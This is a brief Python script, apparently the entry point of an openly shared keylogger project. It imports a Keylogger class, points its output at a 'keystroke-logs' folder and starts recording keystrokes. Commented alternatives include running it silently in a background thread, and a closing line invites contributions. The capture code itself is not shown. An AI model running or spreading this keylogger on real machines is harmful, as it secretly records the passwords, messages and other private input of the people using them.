import threading
from keylogger import Keylogger

stroke_logger = Keylogger()
stroke_logger.dir = "keystroke-logs"
stroke_logger.run()

# Keylogger().run()
# Keylogger("logs").run()
# threading.Thread(target=Keylogger("logs").run).start()

# Refer to README.md for more info
# Feel free to contribute to fix any problems, or to submit an issue!
